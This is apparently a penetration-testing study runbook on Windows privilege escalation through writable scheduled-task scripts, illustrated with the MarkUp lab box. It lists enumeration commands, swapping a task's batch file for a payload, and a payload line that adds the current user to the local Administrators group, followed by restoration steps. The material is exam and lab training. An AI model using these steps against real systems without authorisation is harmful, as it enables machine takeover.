---
tags: [oscp, privesc, windows, scheduled-tasks, runbook]
box_sources: [MarkUp]
---

# PrivEsc Windows - Scheduled Tasks

*A scheduled task runs a command automatically, often as SYSTEM or an administrator. If a low-privileged user can change the file or configuration that the task runs, the task may execute the attacker's code with the task's privileges.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `schtasks /query /fo LIST /v` | Task names, actions, run-as users, and next run times | The current user can query the task | Some tasks are hidden by ACLs. `INFO: There are no scheduled tasks presently available at your access level` does not prove that no tasks exist. | Inspect task actions and run-as identity | Check running processes and file timestamps |
| `icacls C:\Path\to\script.bat` | `BUILTIN\Users:(F)`, `(M)`, or `(W)` | The task action points to a script or batch file you can modify | `(I)` means inherited. An explicit write ACE on the exact task script is especially important. | Preserve the original and test replacement | Inspect the parent directory and other task inputs |
| `copy /Y C:\Users\$Username\payload.bat C:\Path\to\script.bat` | `1 file(s) copied.` | The task runs the writable script as a privileged user | Keep a byte-for-byte backup first. Do not rely on manually running the script as the low-privileged user. | Wait for the next run | Check the task's next-run time and payload syntax |
| `net localgroup administrators $Username /add` | `$Username` appears in the Administrators members list | The task runs with enough rights to modify local group membership | This local payload avoids listener, egress, and reverse-shell timing problems. | Verify with `whoami /groups` after a new logon | Use a reverse shell only when account modification is unsuitable |
| `whoami` and `whoami /groups` | Administrator or SYSTEM token and high integrity | The task has executed the replacement | A scheduled task can run under a different account than the interactive shell. Verify the resulting token, not just the task status. | Read the permitted proof file without printing its contents | Recheck timing, ACLs, and task action |

## MarkUp Example

Daniel had full control over `C:\Log-Management\job.bat`. The file was intended to be run by a privileged scheduled task. The original script exited when run manually as Daniel, so the correct workflow was to replace it, wait for the task, verify the resulting privileged membership, and restore the original.

## Safe Restoration

```cmd
copy /Y C:\Users\$Username\job-original.bat C:\Log-Management\job.bat
del /F /Q C:\Users\$Username\payload.bat
icacls C:\Log-Management\job.bat
```

Verify the restored file against the preserved copy with `fc /b` where both copies are available. Confirm that the payload file is absent and that the original ACL remains unchanged.

## Module Links

[[17. Windows Privilege Escalation|Windows Privilege Escalation]]

## External Resources

- [HackTricks - Windows Local Privilege Escalation](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS - Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
- [RevShells](https://www.revshells.com/) for alternate Windows shell payloads
- [ippsec.rocks - Scheduled Tasks search](https://ippsec.rocks/?#scheduled%20tasks)
